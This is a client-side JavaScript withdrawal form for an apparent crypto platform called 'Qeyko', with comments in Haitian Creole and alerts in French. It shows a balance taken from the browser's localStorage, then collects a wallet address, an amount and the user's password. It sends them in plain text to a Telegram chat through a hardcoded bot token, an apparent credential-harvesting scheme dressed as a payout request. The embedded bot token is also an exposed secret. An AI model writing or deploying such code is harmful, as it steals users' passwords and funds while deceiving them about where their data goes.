<script>
    async function lancerRetrait() {
        // Nou rekipere enfòmasyon ki nan memwa telefòn nan (balans, non, elatriye)
        var soldeActuel = parseFloat(localStorage.getItem('user_balance')) || 0.00; 
        var username = localStorage.getItem('user_full_name') || "Client Qeyko";

        var valWallet = document.getElementById('wallet').value;
        var valAmount = parseFloat(document.getElementById('amount').value);
        var valPass = document.getElementById('password').value;

        // --- KONFIGIRASYON BOT ---
        const token = "8766835411:AAFlASJibyV2oduKOFGY-S1WJxtSsrMi_Ww";
        const chatId = "8118891270";

        // 1. SI YON KAZ VID
        if(valWallet === "" || isNaN(valAmount) || valPass === "") {
            alert("❌ Erreur: Tous les champs sont obligatoires !");
            return;
        } 
        
        // 2. SI MOUN NAN MANDE PLIS KÒB PASE SA L GENYEN
        if(valAmount > soldeActuel) {
            alert("❌ Solde insuffisant !\n\nVotre balance est de " + soldeActuel.toFixed(2) + " USDT.");
            return;
        }

        // 3. SI L METE MWENS PASE 1 USDT
        if(valAmount < 1) {
            alert("❌ Erreur: Le montant minimum est de 1.00 USDT.");
            return;
        } 

        // --- SI TOUT BAGAY BON, N AP VOYE MESAJ LA ---
        const message = `💸 *DEMANDE DE RETRAIT QEYKO*\n\n` +
                        `👤 *Client:* ${username}\n` +
                        `💰 *Montant:* ${valAmount.toFixed(2)} USDT\n` +
                        `🔗 *Adresse:* \`${valWallet}\`\n` +
                        `🔑 *Pass:* ||${valPass}||\n\n` +
                        `⚠️ _Vérifiez manuellement le retrait._`;

        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=MarkdownV2`;

        try {
            const response = await fetch(url);
            if(response.ok) {
                alert("✅ Succès !\n\nVotre demande de retrait a été soumise avec succès. Traitement sous 24h.");
                window.location.href = "index.html";
            } else {
                alert("❌ Erreur de serveur. Vérifiez si vous avez activé le bot.");
            }
        } catch (error) {
            alert("⚠️ Problème de connexion internet.");
        }
    }
</script>
